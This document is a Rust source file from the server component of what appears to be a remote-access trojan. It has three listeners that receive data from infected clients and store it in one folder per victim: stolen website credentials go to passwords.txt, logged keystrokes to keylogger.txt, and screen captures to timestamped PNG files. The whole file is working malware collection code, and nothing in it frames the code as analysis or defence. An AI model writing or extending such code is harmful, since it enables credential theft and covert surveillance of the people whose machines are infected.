//passive listeners for modules that dont take any human interaction, like keylogging and screencaps
// each unique socket addr has their own folders for data
use std::time::Duration;

use chrono::{Datelike, Timelike, Utc};
use tokio::{fs::{self, create_dir, File}, io::AsyncWriteExt, sync::mpsc::Receiver, time::sleep};
use crate::SRV_SAVE_DIR;

// listen for any passwords that have been found and sent from client, then store them
pub async fn pasw_stealer_listener(mut rx: Receiver<Vec<u8>>, identifier: &str) -> std::io::Result<()> {
    let directory = format!("{}/{}/", SRV_SAVE_DIR, identifier);
    if !fs::try_exists(&directory).await? {
        create_dir(&directory).await?;
    }
    let file_path = format!("{}passwords.txt", directory);
    if !fs::try_exists(&file_path).await? {
        File::create(&file_path).await?;
    }
    let mut file = File::options().write(true).truncate(true).open(file_path).await?;
    while let Some(data) = rx.recv().await {
        let mut line: Vec<u8> = vec![];
        let url_len = data[0] as usize + 1;
        line.extend(&data[1..url_len]);
        line.push(32);
        let usr_len = data[url_len] as usize;
        line.extend(&data[url_len+1..url_len+1+usr_len]);
        line.push(32);
        line.extend(&data[url_len+2+usr_len..]);
        line.extend("\n".as_bytes());
        file.write(&line).await?;
    }

    Ok(())
}
//write any logged keys to a file
pub async fn keylog_listener(mut rx: Receiver<Vec<u8>>, identifier: &str) -> std::io::Result<()> {
    let directory = format!("{}/{}/", SRV_SAVE_DIR, identifier);
    if !fs::try_exists(&directory).await? {
        create_dir(&directory).await?;
    }
    let file_path = format!("{}keylogger.txt", directory);
    if !fs::try_exists(&file_path).await? {
        File::create(&file_path).await?;
    }
    let mut file = File::options().append(true).open(file_path).await?;
    while let Some(data) = rx.recv().await {
        file.write_all(&data).await?;
        file.flush().await?;
    }
    file.shutdown().await?;
    Ok(())
}

//save sc images in folder
pub async fn screenshot_listener(mut rx: Receiver<Vec<u8>>, identifier: &str) -> std::io::Result<()> {
    let directory = format!("{}/{}/",SRV_SAVE_DIR, identifier);
    if !fs::try_exists(&directory).await? {
        create_dir(&directory).await?;
    }
    while let Some(data) = rx.recv().await {
        let time = Utc::now();
        let file_path = format!("{}screenshot-{}-{}-{}T{}-{}-{}.png",
        directory,
        time.year(),
        time.month(),
        time.day(),
        time.hour(),
        time.minute(),
        time.second());
        if !fs::try_exists(&file_path).await? {
            File::create(&file_path).await?;
        }
        let mut file = File::options().write(true).open(file_path).await?;
        file.write_all(&data).await?;
        file.shutdown().await?;
        sleep(Duration::from_secs(1)).await;
    }


    Ok(())
}
